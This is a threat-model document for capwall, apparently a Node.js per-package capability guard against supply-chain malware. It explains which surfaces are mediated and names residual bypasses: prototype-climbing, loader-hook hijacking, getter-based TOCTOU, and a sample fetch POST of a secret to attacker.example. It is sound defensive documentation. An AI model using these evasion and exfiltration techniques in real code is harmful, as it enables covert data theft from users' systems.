# capwall threat model

This document is the source of truth for **what capwall protects against and what it does
not.** Read it before relying on capwall. If you change the engine, keep this document in
sync — overclaiming here is a security bug.

## One-sentence summary

capwall is **pragmatic, runtime, per-package defense-in-depth against opportunistic
supply-chain malware.** It is **not** a formal sandbox and does not withstand a determined
in-process attacker.

## Implementation status (keep in sync with the roadmap)

As of roadmap **M5**, all core capability surfaces are mediated on **both the CJS `require`
path and the ESM `import` path**: `fs`, `net`/`http`/`https`/`tls`/`http2`/`dgram`,
`child_process`, `worker_threads`, `vm`, and `process.env`. Roadmap **S2** adds `native`, a
load-time gate on `.node` addons that is module-system-independent (it patches
`process.dlopen`, not a loader). Three surfaces are mediated **outside** both module systems,
because they never route through one: `process.env` (a `Proxy` on the live object), the `native`
gate above, and Node's **global egress APIs** — `globalThis.fetch`/`WebSocket`/`EventSource`,
replaced on `globalThis` since #80 (see "Global egress surfaces" below). ESM interception uses a
`module.register()` loader hook (`loader/esm-hook.ts` + `esm-hooks.ts` + `esm-runtime.ts`)
that rewrites mediated builtin specifiers to a synthetic module re-exporting the same shims
the CJS path uses; it covers **static AND dynamic** `import` (`import { readFile } from
"node:fs"` and `await import("node:fs")`), attributing to the importing package exactly like
CJS. It is **on by default** under the CLI preload (disable with `CAPWALL_ESM=0`).

Interception is decided on the URL a specifier **resolves to**, not on the specifier string
(#59). A specifier does not have to *name* a builtin to reach one — Node's subpath imports let
a package map a private `#…` specifier onto a bare builtin in its own `package.json`
(`"imports": { "#x": "fs" }`; bare targets work, `"node:fs"` targets Node rejects outright),
and conditional and `*`-pattern targets do the same. Classifying on the resolved URL covers
every such spelling at once, including ones nobody has enumerated yet. Verified mediated after
the fix: bare / conditional / `*`-pattern imports targets, `fs/promises` targets,
self-referencing package exports, `data:` URL re-exports and `import.meta.resolve`. The only
probed route still reaching a raw builtin is `process.getBuiltinModule` — the pre-existing,
path-independent residual listed under "what capwall does NOT stop", which defeats the CJS
patch identically and is not ESM-specific.

The shims are handed out **mutable by default** (so `graceful-fs` and friends keep working);
`install(policy, mode, { hardened: true })` / `CAPWALL_HARDENED=1` freezes them instead —
**off by default**, see § Hardened mode for what that does and does not buy.

**Install lifecycle — what a policy swap and `uninstall()` do.** This applies to **both** module
systems and to the non-import-routed guards (`process.env`, the egress globals, the native gate);
it was fixed for ESM in #62 and for CJS in #87, and until #87 the two paths behaved differently.
The thing that makes it subtle is that mediated references are **captured**: a CJS module's
`const fs = require("node:fs")`, an ESM `const` import binding, a stashed `process.env`. Whatever
those captures point at is what enforces policy for the rest of the process, and a capture cannot
be revoked.

- **Already-captured references follow the LIVE policy, in both directions.** `uninstall()` +
  `install(tighter)` applies to a shim a module captured under an earlier install, and so does
  loosening again. Before #62/#87 a capture was pinned to the install that was active when it was
  made, so tightening was a silent no-op — fail-open with respect to the new policy. On the CJS
  path that also meant a *freshly* required `fs` denied while a captured one allowed: one process
  enforcing two policies at once, decided by when a module happened to call `require`.
- **After the LAST `uninstall()` a capture fails CLOSED** — a deny-all `enforce` policy — rather
  than passing through to the real builtin or continuing to serve the torn-down install's grants.
  "capwall is off again" is not available to a capture; the only options are the dead install's
  grants or none, and serving revoked grants is the fail-open one.
- **The decision sink is dropped with its install.** A post-teardown denial still throws, but it is
  not written into the torn-down embedder's `onDecision` collector or the CLI's trace file — that
  would be a decision belonging to no install landing in the previous one's audit trail.
- **A FRESH access after the last `uninstall()` is genuinely un-mediated on the CJS path**, because
  the interception points (`Module._load`, `process.env`, `process.dlopen`, the egress globals)
  really are restored. Fail-closed is about stale captures, not about leaving a torn-down process
  deny-all. The ESM path differs — see the next section.
- **Installs nest**, innermost wins, and they unwind in **any** order, not only LIFO (#22 for the
  `Module._load` chain, #87 for the policy stack). Unwinding one install re-exposes the one below
  it, including for already-captured shims.
- **`hardened` is the one setting that is not live.** It freezes objects as they are built and a
  frozen object cannot be unfrozen, so a capture keeps the hardening of the install that built it.
  A later install's `hardened` still governs shims handed out fresh after it.
- **None of this is dependency-reachable** — a dependency cannot call `install()`. It matters for
  embedders swapping policy at runtime and for programmatic tests, which is why #87 is rated MEDIUM
  rather than a live bypass.

**ESM known limits** (documented, not silent):
- A module that captured a raw builtin **before** capwall installed is not re-bound (same as
  CJS — install via the `--import` preload so capwall registers first).
- The set of mediated specifiers is fixed at install time; a mediated builtin not in the shim
  registry is not intercepted (the registry covers the capabilities above).
- Unregistering the ESM hook is best-effort (Node cannot fully remove a registered hook), so ESM
  teardown is **fail-closed rather than reversible** — this is the one place the lifecycle above
  differs between the two paths. On CJS, a fresh `require` after the last `uninstall()` reaches the
  real builtin; on ESM there is no equivalent, because the hook is still registered and an import
  binding cannot be un-bound. A mediated builtin **not yet imported** when `uninstall()` ran
  therefore throws an explicit "capwall is no longer installed" error on re-import, and one a
  module **had already imported** denies under the deny-all torn-down policy (#62 — before that
  fix it kept serving the torn-down install's grants, so this bullet previously overclaimed: it
  was true only for never-imported specifiers).
- **capwall cannot guarantee it stays outermost in the loader-hook chain** (#61). See
  "Loader-hook registration" below — this is the significant residual on the ESM path.
- `process.env` is not import-routed; its Proxy guard (installed by `install()`) covers both
  module systems already. The same is true of the **global egress guard** (#80) — `fetch`,
  `WebSocket` and `EventSource` are globals, so they are mediated by replacing them on
  `globalThis`, independently of either module system. See "Global egress surfaces" below.

**Loader-hook registration (#61) — partially closed, residual named.** Node's module
customization hooks are deliberately composable: the **most recently registered hook runs
first**, and the synchronous `module.registerHooks()` chain runs entirely ahead of the
asynchronous `module.register()` chain capwall lives in. A dependency that reaches
`register`/`registerHooks` can therefore short-circuit a mediated specifier straight to the
real `node:` URL before capwall's `resolve` is consulted — and because the hook is
process-wide and the ESM cache is keyed by resolved URL, that de-mediates **every** package
loaded afterwards, not just the attacker: an innocent third dependency's ordinary
`import * as fs from "node:fs"` binds to the raw builtin, with no log line.

What capwall does about it: `node:module` is mediated, and `register`/`registerHooks` are
treated as **application-only**. A registration attributed to a dependency is refused with a
`CapabilityError` in `enforce`, and warned about loudly in `observe` (which by contract never
blocks). `CAPWALL_ALLOW_LOADER_HOOKS=1` permits it, still warning, for a tree where a
dependency legitimately installs a loader. Everything else on `node:module` passes through
untouched, so the application's own tooling (`tsx`, `ts-node`, a custom loader) is unaffected —
the app is the trust root.

What it does **not** do, plainly:

- It gates *reaching* the API through a mediated module, not the API itself.
  `process.getBuiltinModule("node:module")` hands over the real one and defeats this exactly as
  it defeats every other shim.
- The gate allows `<app>`, so it inherits whatever attribution fails open to. The `data:` URL
  escape tracked as **#60** walks past it exactly as it walks past the `process.env` and
  `dgram` gates (verified). That is one bug in attribution, not three in the gates.
- A hook registered **before** capwall installs is already ahead of it.
- capwall does **not** re-assert first position after an allowed registration. It could — the
  synchronous chain can be rejoined — but that would silently override the application's own
  loader tooling, and it still would not beat a hook that short-circuits `load` as well as
  `resolve`, which nothing in-process can.
- As defense in depth the `load` hook **re-mediates** any raw `node:<mediated>` URL it is
  handed and warns once per specifier, since capwall's own `resolve` never emits one. Measured
  reach, so this is not read as more than it is: a `node:` URL already resident in the ESM
  module cache is served from cache and the load chain is never consulted — and capwall's own
  shims capture their real modules with a static ESM `import`, so every mediated builtin is
  already cached raw before the hook registers. Today this branch is therefore a **latent**
  backstop for the mediated set, active only for specifiers capwall does not itself import and
  for resolution routes a future Node might add. Capturing the real modules through
  `createRequire()` would make it active for the whole set (a CJS `require` does not populate
  the ESM cache — verified); that is follow-up work, not something this change claims.

Net: a dependency doing this opportunistically is now stopped and logged. A dependency that
knows about capwall has routes left. Treat ESM mediation as effective against packages that do
not go looking for the loader chain.

Per-capability notes:

- **`fs`** — path-taking read/write families (sync, callback, `fs.promises`) plus the
  path-taking stream constructors (`ReadStream`/`WriteStream` and their `File*Stream`
  aliases, guarded as **guarded subclasses** — see "Capability-bearing classes" below).
  Purely fd-based operations (`fs.read`, `fs.write`, `ftruncate`, …) are not
  mediated — consistent with the fd-escape exclusion below.
- **`net`/`http`/`https`/`tls`/`http2`/`dgram`** — **egress only**. Mediated: `net.connect`/
  `createConnection` **and** `new net.Socket().connect()`; `http(s).request`/`get` **and**
  `new http.ClientRequest()`; `http(s).Agent#createConnection`, on both a caller-built agent and
  the pre-built `http(s).globalAgent` **instance** (#65 — see "Capability-bearing instances"
  below); `tls.connect` and `new tls.TLSSocket().connect()`;
  `http2.connect`; and `dgram` socket `send`/`connect` (UDP). Each core egress module is
  shimmed separately on purpose: capwall's require patch only affects `Module._load`-routed
  requires (user/dependency code); Node's own HTTP client loads `net` through the internal
  bootstrap loader, which never hits `Module._load`, so one module's shim never covers
  another — and a dependency could otherwise bypass the control simply by choosing `tls`
  (or `dgram`) over `net`. **The same reason means there is no `net`-shim backstop behind
  `fetch`** (verified empirically, not assumed): Node's global `fetch` dials through the internal
  undici stack, which is bootstrap-loaded and never hits `Module._load`, so before #80 a
  dependency's `fetch` under a deny-all `enforce` policy produced **no decision at all** — not a
  denial, not a log line. That is why the global egress guard above exists as a separate
  mechanism rather than as one more module shim. Inbound `server.listen` is not gated (capwall mediates who a
  package may *reach*, not that it may serve). IPC/unix-socket connects have no host:port and
  are approximated coarsely as `{ host: "<ipc>", port: 0 }`. `dgram` ops attributed to `<app>`
  are not gated (the app is the trust root, as for `process.env`); since #60 that requires a
  positively identified application frame, and Node's auto-bind `send` replay — which used to
  ride on the old fail-open, because Node re-invokes `send` from the socket's `'listening'`
  event on a stack with no caller frame — is handled by state instead. Since #86 that state is
  a **single-use authorization pinned to one socket and one destination**: while an authorized
  send is on the stack, the guarded `send` accessor yields a token good for exactly the host:port
  the policy just allowed, once, on that socket; every other use of it falls back to the full
  guard. So the replay is forwarded without a second check, and nothing that can be obtained
  from that state can reach a destination the policy did not already allow. The `dgram`
  destination is derived POSITIONALLY, mirroring Node's own argument normalization, because Node
  accepts a port as a numeric string (`send(buf, "9999", host)`); a type-based derivation saw no
  number, concluded there was no destination and skipped the gate entirely.
  Capability-bearing classes
  (`net.Socket`, `tls.TLSSocket`, `http.ClientRequest`, `http.Agent`, `dgram.Socket`) are
  guarded via a **guarded subclass** whose prototype method (or constructor) runs the check,
  so `new Cls()`, `(instance).constructor`, `Cls.prototype.constructor`, and
  `Cls.prototype.method.call(...)` are all covered (a construct-trap Proxy would not be — see
  "Capability-bearing classes" below). The pre-built `http(s).globalAgent` **instances** are
  guarded too, as of #65 — before that fix they were live `Agent` objects the shim copied
  through verbatim, so `http.globalAgent.createConnection({host, port})` opened a socket with no
  check and, worse, **no recorded decision**: `observe` and `capwall diff` could not see it
  either. See "Capability-bearing instances" below. The getter-based TOCTOU tracked as #26 and
  #56 — a package with a narrow net grant supplying an options object (or a `URL` instance)
  whose destination-deciding fields were accessor properties returning the granted value when
  capwall derived the guarded target and a different value when Node itself re-read them — is
  **closed**, with the guarantee scoped as follows.

  capwall never forwards a caller's options object or `URL`. It reads each destination-deciding
  field exactly once — `host`/`hostname`/`port`/`path` for `net`/`tls`/`http2` options,
  `host`/`hostname`/`port`/`socketPath`/`defaultPort` for `http(s)` options, and the nine URL
  fields Node's `urlToHttpOptions` derives — and forwards a clone carrying those single reads as
  plain data properties, or (for a `URL`) a synthesized options object / authority string built
  from that one snapshot. **Every** own accessor on a forwarded object is additionally flattened
  to a value during the clone, on every key, not just the listed ones. So the object Node reads
  contains no getters at all: for the fields above, Node observes exactly the value that was
  guarded; for any other field, Node observes a value that cannot change between reads. #56 was
  the case that motivated the second rule — `path` (the unix-socket destination) was not on the
  first version's list, so its accessor rode into the clone live, and a package granted one TCP
  endpoint could reach an arbitrary unix socket by returning `undefined` on the read capwall saw
  and `/var/run/docker.sock` on the read Node made.

  **Still open, deliberately.** (a) IPC is modelled COARSELY: every unix-socket/named-pipe
  connect is the single pseudo-target `<ipc>:0`, so a package granted `<ipc>` may reach **any**
  local socket, not the one it was observed using. Granting `<ipc>` is close to granting local
  IPC wholesale — review it as such. (b) `options.createConnection` (`http(s)`/`http2`) lets the
  caller supply the function that opens the socket; capwall guards the target it derived, but a
  function that ignores its options and dials elsewhere is only re-gated if the module it uses
  to dial is itself capwall-mediated — the same class as the pre-install capture residual below.
  (c) `dns` lookups are not mediated (a lookup moves no payload; DNS tunneling is a
  determined-attacker technique out of scope), so a granted host name resolving to an attacker's
  address is not caught here. (d) Reaching the real prototype by climbing past the guard — two
  levels from an instance of a guarded class
  (`Object.getPrototypeOf(Object.getPrototypeOf(sock)).connect`), equivalently one hop from the
  class object (`net.Socket.prototype.__proto__.connect`), or one hop from a guarded *instance*
  view (`Object.getPrototypeOf(http.globalAgent).createConnection.call(agent, opts)`) — the same
  class as the general shim un-patching residual, in-process code deliberately climbing above the
  guard. These are documented residuals, not silent gaps.

  An IPv6 literal is guarded, recorded, and matched **unbracketed** (`::1`, the form Node
  dials); see `docs/policy-format.md`.
- **`child_process`, `worker_threads`, `vm`** — boolean **gates** (may this package spawn /
  start a worker / use `vm` at all). Gating, not confinement: capwall does not constrain what
  the subprocess/worker/vm-context does once started (see § gating vs confinement). The
  capability-bearing classes on these surfaces — `child_process.ChildProcess`,
  `worker_threads.Worker`, `vm.Script`, and (only when `--experimental-vm-modules` makes them
  exist) `vm.SourceTextModule`/`vm.SyntheticModule` — are guarded subclasses, so the class is
  gated as well as the module function.
- **`native` (`.node` addons)** — a **load-time gate, not a runtime sandbox** (roadmap S2,
  issue #49). capwall decides whether a package may load a native addon at all; it does not,
  and will not, confine what that addon does once loaded. Read the whole of § Native `.node`
  addons below before granting it — of every capability in the format, this is the one whose
  limits matter most.
- **`process.env`** — a read allowlist enforced via a `Proxy` on `process.env` (`get` **and**
  `getOwnPropertyDescriptor` traps, so `Object.getOwnPropertyDescriptor(process.env, k).value`
  cannot leak a value a direct read denies). Reads attributed to `<app>` pass through ungated
  — the app is the trust root — but that means a **positively identified application source
  file on the stack**, and nothing else. A read capwall cannot attribute is `<unknown>` and is
  gated exactly like a dependency's (see § attribution outcomes). `CAPWALL_*` keys (capwall's
  own preload plumbing) are never gated or recorded. When a package **spawns a child**, Node
  reads `process.env` to build the child's environment block; those reads are exempted (the
  child_process shim suspends the env gate around the spawn) so an allowed spawn inherits a
  real environment rather than an empty one. A denied env read is a **soft deny**: it returns
  `undefined` (hiding the value) rather than throwing, so a benign dependency probing an
  optional var is not crashed. The denial is still recorded and logged. **Key NAMES stay
  enumerable** to a denied dependency (`Object.keys`, `in`, `for..in`); only VALUES are hidden
  — names are not the secret, and hiding them would break feature-detection.

  **Name-level vs value-level (#67).** The gate applies to *values*, and only value-yielding
  operations are recorded. Everything that hands a dependency a value goes through `[[Get]]` —
  `env.K`, destructuring, `JSON.stringify(env)`, `{...env}`, `Object.entries`/`Object.values` —
  and is gated **and** written to the trace. Name-level operations — `in`, `Object.keys`,
  `for..in`, `Object.getOwnPropertyNames` — are neither gated nor recorded. The
  `getOwnPropertyDescriptor` trap straddles both: `Object.keys` and `for..in` call it once per
  key just to read `[[Enumerable]]`, and it cannot distinguish that from a genuine descriptor
  read (identical arguments, identical caller stack). It therefore **hides** the value for a
  denied key (unconditionally — that is the security property) but does **not record**.
  *Residual:* a `getOwnPropertyDescriptor(env, k).value` read attempt is blocked but no longer
  appears in the audit trail. Recording it instead would log every `for..in` as a value read of
  every key in the environment, which made `observe` output a property of the host machine
  rather than of the package and printed `DENY '<pkg>' env:AWS_SECRET_ACCESS_KEY` for mere
  enumeration. The available discriminators (an `ownKeys`-primed "enumeration epoch" heuristic;
  returning an accessor descriptor so only an explicit `desc.get()` records) are spoofable by
  the attacker they target or catch only an attacker who has already adapted to capwall, and a
  spoofable heuristic inside the anti-exfiltration control is worse than a documented gap.

  **Writes are NOT mediated (#66).** `env` grants are a *read* allowlist; a dependency may set,
  delete, and `defineProperty` on `process.env` freely, exactly as un-shimmed. The proxy's `set`
  trap exists only to restore ordinary assignment semantics — without it, assignment to an
  already-set key crashed the host app with `ERR_INVALID_OBJECT_DEFINE_PROPERTY`. *Residual:* a
  dependency can set `NODE_OPTIONS`, `LD_PRELOAD`, `NODE_EXTRA_CA_CERTS` or proxy variables to
  influence other code. In-process this is largely inert (`NODE_OPTIONS` is consumed at startup,
  before any dependency runs); its payoff is in a **child process**, and spawning is already a
  gated capability, so the spawn is the control point. A proxy variable that redirects egress is
  still subject to the `net` gate, which guards the target actually connected to. Gating writes
  would require write-grant vocabulary the policy language does not have, and soft deny does not
  compose with writes (a silently dropped write leaves the dependency believing it succeeded; a
  throwing write reintroduces the crash). Tracked as a policy-language question, not a bug.

**Capability-bearing classes are guarded subclasses, not Proxies.** Where a capability can be
reached through a class rather than a module function, capwall replaces the class with a
**subclass it owns**, whose constructor (or prototype method) runs the check before delegating,
plus a `Symbol.hasInstance` override so `instanceof` still answers correctly for instances
built by the real builtin's own factories. That covers `fs.ReadStream`/`WriteStream` (and the
`File*Stream` aliases), `vm.Script`/`SourceTextModule`/`SyntheticModule`,
`worker_threads.Worker`, `net.Socket`, `tls.TLSSocket`, `http(s).ClientRequest`,
`http(s).Agent`, `dgram.Socket`, and `child_process.ChildProcess`.

That `Symbol.hasInstance` override checks its **receiver** before answering permissively (#71).
The method is inherited down the static chain, so a dependency writing the entirely ordinary
`class Mine extends net.Socket {}` used to get a subclass that reported `someUnrelatedRealSocket
instanceof Mine === true`, where un-shimmed Node says `false`. That was a correctness deviation
rather than a bypass, but silently inverting a package's type dispatch is not a thing a security
tool should do; the override now falls back to ordinary prototype-chain semantics for any
receiver that is not the guarded class itself, and one shared implementation
(`shims/runtime.ts`) serves every guarded class.

**Capability-bearing instances are guarded views (#65).** A builtin namespace does not only
export functions and classes — it can export a live, pre-built **instance** that already carries
the capability, and each shim's namespace-copy loop duplicated those through with their real
methods intact. `http.globalAgent`/`https.globalAgent` were exactly that: any dependency could
call `http.globalAgent.createConnection({host, port})` and connect under a deny-all `enforce`
policy, with **no log line** — the unlogged part being the worse half, since egress is the
payload step of the attack class capwall exists to contain and `observe`/`capwall diff` could
not surface it. Both are now wrapped in a guarded **view**: a `Proxy` that forwards every read
and write to the one real agent (so the shared, process-global connection pool, `maxSockets`,
keep-alive, `agent.sockets` and `instanceof` all keep working — `globalAgent` is on the default
path for nearly every HTTP call) and replaces only `createConnection`, which is gated with the
same resolver the guarded `Agent` subclass uses.

A `Proxy` is the right tool *here* and remains the wrong one for a class: the #64 objection is
that a proxied class's `.prototype.constructor` is the real class, and an instance has no
`.prototype` to leak through. The alternatives were worse — a freshly constructed guarded agent
would be a *different* pool (so `http.globalAgent.maxSockets = N` would silently stop affecting
real requests), and patching the real instance's method would mutate a **process-global that
outlives `uninstall()`**, which is the same constraint that keeps real builtins unfrozen.

The audit behind #65 walked every object-valued export of every shimmed namespace on Node 20 and
22. `http.globalAgent` and `https.globalAgent` were the only capability-bearing ones; the rest
are inert data (`fs.constants`, `http.METHODS`, `http.STATUS_CODES`, `tls.rootCertificates`,
`http2.constants`, `vm.constants`, `worker_threads.resourceLimits`) or an already-shimmed
sub-namespace (`fs.promises`).

**Global egress surfaces are mediated as of #80 — but by a different mechanism, with its own
limits.** Everything else capwall intercepts arrives through a module load: `require`/`import`
hands back a shim. `fetch`, `WebSocket` and `EventSource` are **globals**, never imported, so the
loader mechanism never sees them. Before #80 that was a plain gap, not a determined-attacker
residual: a dependency calling
`fetch("https://attacker.example/", {method:"POST", body: secret})` under a **deny-all `enforce`
policy** exfiltrated successfully with **zero decisions recorded** (confirmed empirically during
the #65 audit) — one line, no reflection, no `require` for a reviewer to grep for, and invisible
to `observe`/`capwall diff` as well.

capwall now installs a **global egress guard** (`shims/global-egress.ts`), which replaces those
globals with guarded equivalents for the life of the install. What it covers and how it behaves:

- **Which globals.** Enumerated against the supported range (Node 20.19 / 22.22 / 24.5, with and
  without the relevant `--experimental-*` flags), not guessed: `fetch` (present everywhere),
  `WebSocket` (Node ≥22 unflagged; `--experimental-websocket` on 20) and `EventSource`
  (`--experimental-eventsource` on every supported version). Each is replaced **only if it is
  already present**, so a flag-only API is picked up when the flag is on and nothing is invented
  on a Node that lacks it. `navigator.sendBeacon` **does not exist in any supported Node** —
  Node's `navigator` carries `userAgent`/`platform`/`language(s)`/`hardwareConcurrency` only — so
  there is deliberately no guard code for it.
- **How a FUTURE global egress API is caught.** `test/global-egress-inventory.test.ts` enumerates
  `globalThis` in a clean child process and fails when a name appears that is in neither the
  guarded list nor a reviewed-inert list, and separately asserts `navigator.sendBeacon` is still
  absent. A new global cannot land in a Node minor release without breaking that test and forcing
  someone to classify it. That test is the control; the table above is just its current state.
- **`http.WebSocket`** (Node ≥22 re-exports the same class onto the `http` namespace) is guarded
  too. While the global was un-mediated, shimming that copy bought nothing; now that the global is
  guarded, the module copy would be the remaining one-liner. Note the one deviation: the two
  guarded copies are not `===` to each other the way the real ones are. `instanceof` still answers
  correctly for both.
- **Policy shape: the existing `net` grant**, not a new capability. A dependency dialing
  `example.com:443` holds the same authority whether it got there through `http.request`,
  `net.connect` or `fetch`; splitting them would let a policy grant one and not the other by
  accident. Every existing policy, `observe` trace, `gen-policy` output and `capwall diff` covers
  the new surface with no schema change.
- **Target derivation reuses the single-read pinning** the `net` shim uses (`shims/url-snapshot.ts`,
  shared by both so they cannot drift). This is the #26/#56 TOCTOU class and both shapes were
  verified to be exploitable without it: a `URL` whose `toString` answers differently on the second
  read sends the request to the **second** value; and a `Request` with an OWN shadowed `url`
  accessor reports whatever the attacker chose while undici dials the real internal URL — so the
  guard reads a `Request`'s destination through the **real `Request.prototype.url` getter**, which
  reaches the same state undici dials from and steps over the shadow. For strings and `URL`s,
  capwall performs exactly one `String(input)` — the same conversion undici performs — and forwards
  that immutable string, so there is no second read left to diverge.
- **Attribution is unchanged and lands on the dependency.** The guard runs synchronously, on the
  caller's own stack, before the first `await`, so a dependency's `fetch` is charged to that
  dependency — not `<app>`, and not `<unknown>` (which would have forced every real app to grant
  `<unknown>` just to use `fetch`). A dependency that detaches first
  (`setTimeout(() => fetch(evil))`) is `<unknown>` and denied by default, exactly like every other
  laundering shape since #60.
- **A denial is delivered through the channel the real API uses**, same rule as `fs` (see
  "Behavior change vs. real `fs`" below). Real `fetch` **never throws synchronously** — every
  failure, including an unparseable URL or calling it with no arguments, arrives as a rejected
  promise (verified on Node 20 and 22) — so a denied `fetch` **rejects** with a `CapabilityError`
  rather than throwing, or `fetch(url).catch(handle)` would crash with an uncaught exception it
  would never see from real `fetch`. `new WebSocket(…)` / `new EventSource(…)` *do* throw
  synchronously on a bad argument, so a denial there throws, matching. The guard itself always
  runs synchronously on the caller's stack; only the delivery of the outcome differs.
- **`data:` and `blob:` are not gated** — they resolve in-process and move no bytes onto a network,
  so gating them would deny-by-default an inert `fetch("data:…")`. Every other scheme IS gated,
  including ones capwall does not recognize (fail-closed).
- **`uninstall()` restores the originals** and leaves no capwall object on `globalThis`. The
  replacement property is installed `configurable: true` **even under hardened mode**, because a
  non-configurable global could never be restored by anyone — the same process-global constraint
  that keeps real builtins unfrozen (#77) and that shaped #65's Proxy-view approach. Restoration is
  skipped if something else replaced the global after capwall, so a later legitimate replacement is
  not clobbered. A dependency that **captured** the guarded `fetch` before teardown still holds it,
  and it follows the live policy like any other capture — see § Install lifecycle (#87).
- **Hardened mode (#17)** installs the guarded global `writable: false` (so `globalThis.fetch =
  evil` silently no-ops in sloppy-mode CJS and throws under `"use strict"`) and freezes the wrapper
  function / guarded class. `Object.defineProperty(globalThis, "fetch", …)` remains open — the same
  class of residual as climbing past a guarded prototype, and the price of a restorable global.
- **Switchable off**: `install(…, { globalEgress: false })` / `CAPWALL_GLOBAL_EGRESS=0`, for a
  process where writing to `globalThis` is unacceptable.

**Global egress residuals, named.**

1. **Redirects are guarded only after the fact.** `redirect: "follow"` is fetch's default and the
   following happens inside undici, where capwall has no interception point: by the time anything
   is observable, the request — body included — has already reached the redirect target. capwall
   guards the **final origin** on the response, so the hop is **recorded** (visible to `observe`,
   `gen-policy` and `capwall diff`) and, in `enforce`, the response body is cancelled and the call
   rejected with a `CapabilityError` rather than handing the dependency the attacker's reply. That
   contains the *response*, not the request. Re-implementing redirect following on
   `redirect: "manual"` was considered and rejected: `Response.url` and `Response.redirected` are
   computed from internal state a userland re-issue cannot set, so every redirect-following `fetch`
   in the process would start reporting `url: ""` / `redirected: false`, and 307/308 body replay is
   not expressible for a stream body — a behavioral break on ordinary traffic in exchange for a hop
   whose target the attacker does not choose. Intermediate hops in a chain are not visible at all;
   only the final origin is.
2. **`init.dispatcher`.** Node's `fetch` honors undici's non-standard `dispatcher` option, which
   lets the caller supply the code that opens the socket — verified to be reachable with a plain
   hand-rolled object. This is the same class as the `options.createConnection` residual already
   documented for `http(s)`: capwall guards the target it derived, and a dispatcher that dials
   elsewhere is only re-gated if the module it dials through is itself mediated (userland
   dispatchers, including the npm `undici` package's, reach the network through `net`/`tls`, which
   ARE mediated). capwall does not strip the option, because doing so would break legitimate
   `ProxyAgent`/`MockAgent` interop.
3. **Pre-install capture.** A module that captured `globalThis.fetch` before capwall installed
   holds the raw function — the same residual as every other shim. Install via the `--import`
   preload.
4. **Undici does not route through the mediated modules**, so there is no `net`-shim backstop
   behind any of this — see the note under `net`/`http` below.

The earlier approach for some of those sites was a construct-trap `Proxy`, which **did not
hold**: a `Proxy` forwards property reads to its target, so the proxied class's `.prototype`
is the real prototype and `Cls.prototype.constructor` is the real, unguarded class. A single
line — `new (fs.ReadStream.prototype.constructor)(deniedPath)` — read any file, evaluated any
code (`vm.Script`), or spawned a worker (`worker_threads.Worker`) with the guard never firing.
The worker case was the worst of the three, because a worker is a fresh Node context with none
of capwall's shims in it. All such sites are now subclasses, and a regression test asserts the
`.prototype.constructor` invariant over **every** guarded class in the codebase (issue #64).
A second benefit of that conversion: a subclass is an object capwall owns, so opt-in hardened
mode (#17) can freeze it — a `Proxy` could not be frozen without freezing the real builtin
class it wraps.

**Residual, unchanged:** climbing PAST the guarded subclass still reaches the real method or
class — `Object.getPrototypeOf(fs.ReadStream.prototype).constructor` from the class object, or
two prototype levels up from an instance. That is the same class of escape as un-patching a
shim outright: in-process code deliberately climbing above the guard. capwall does not claim to
stop it. A guarded subclass raises the cost of the accidental and the opportunistic walk; it is
not a boundary.

**Attribution outcomes: `<pkg>`, `<app>`, `<unknown>`.** Every mediated call is charged to one
of three principals. A frame under `node_modules/<pkg>` charges that package. A real source
file **not** under `node_modules` charges `<app>`, the trust root, which the `process.env` and
`dgram` gates exempt. Everything else — no qualifying frame on the stack at all, or app code
reached only *through* code with no filesystem identity (a `data:`/`blob:` module, any
`eval`/`new Function` frame, a bundler `//# sourceURL=`, `node -e`/stdin) — charges
`<unknown>`.

Only a frame's `getFileName()` is used to name a package, because that is the one thing V8
reports from how the code was **loaded** rather than from what the code **says about itself**.
See § `eval` and `new Function` below for the one place capwall got that wrong.

`<unknown>` is an ordinary principal, not an exemption: deny-by-default in `enforce`, recorded
in `observe`, and grantable with an explicit `"<unknown>"` entry in `capabilities.json`. That
entry is the **escape hatch**, and it is needed in practice: Node's own ESM loader reads
`process.env.WATCH_REPORT_DEPENDENCIES` from a stack with no caller frame, so every run under
the CLI produces one unattributable env read. `capwall observe` emits the corresponding grant
automatically. Granting `<unknown>` broadly (`"env": ["*"]`, a wide `net` grant) hands that
authority to **every** call capwall cannot attribute, including a dependency deliberately
running from a `data:` module — so the preload prints a one-line warning at startup when a
policy grants it. Keep the grant as narrow as the observed keys.

Before this split (issue #60), "could not attribute" and "this is the app" were the same value.
See the § attribution laundering residual for what that cost and what remains.

**Behavior change vs. real `fs` (operational note).** In `enforce` mode a denial is delivered
via the SAME channel the real `fs` API would use for that call, not always a synchronous
throw — chosen specifically so idiomatic (try/catch-free) code is not crashed by an uncaught
exception it would never see from real `fs`:

- **`*Sync` methods** (`readFileSync`, …) throw `CapabilityError` synchronously — matches
  real sync `fs`.
- **`fs.promises` methods** reject with `CapabilityError` — matches the real promise API.
- **Callback-style async methods** (`readFile`, `mkdir`, `access`, `rm`, …) invoke the
  caller's own callback as `cb(err)` on `process.nextTick`, exactly as a real async `fs`
  error would arrive, instead of throwing. If the call is missing a callback (a mis-call),
  the shim falls back to a synchronous throw, matching real Node's behavior for the same
  mis-call.
- **`createReadStream`/`createWriteStream`** return a minimal stream (with `.path` set) that
  holds the `CapabilityError` and emits `'error'` with it **as soon as an `'error'` listener
  is attached** to the stream — not on a fixed timer — so a handler attached synchronously,
  on a microtask, on `setImmediate`, or on `setTimeout(0)` is always caught (fix #40; this
  closes the earlier parity gap, where a fixed `setImmediate` delivery could fire before a
  handler attached on a later macrotask, producing an uncaught `'error'` even though the
  consumer did handle errors). A sync throw here would still be a bypass-shaped surprise,
  since `fs.createReadStream(p).on('error', h)` is the idiomatic pattern and never throws
  synchronously in real Node either. If `'error'` is never listened for at all, a safety net
  still delivers the denial after two event-loop phases, so an unhandled denial ultimately
  crashes the process — same as real `fs` would for an unhandled async error — rather than
  silently hanging forever. This is **fail-closed** either way — the read/write never happens.
- **`watch`/`watchFile`** and the `ReadStream`/`WriteStream` **class constructors**
  (`new fs.ReadStream(deniedPath)`) throw synchronously on denial. `fs.watch` and a real
  stream constructor also throw synchronously on a bad argument, so those match. `fs.watchFile`
  is the exception: real `watchFile` does NOT throw (it calls its listener with zeroed stats),
  so the shim's sync throw there is a deliberate loud-failure choice — `watchFile`'s listener
  is `(curr, prev)`, not error-first, so there is no faithful channel to deliver the denial
  through.
- **Buffer path arguments** are decoded with `latin1` (byte-exact — fix #19) before the policy
  check, so the checked path matches the bytes forwarded to real `fs` even for non-UTF-8
  bytes. Trade-off: a **valid non-ASCII UTF-8 path passed as a Buffer** decodes to a different
  (latin1) string than the UTF-8 string a policy glob is authored in, so it may **false-deny**
  (fail-closed — never a false-allow). Uncommon (needs a non-ASCII filename supplied as a
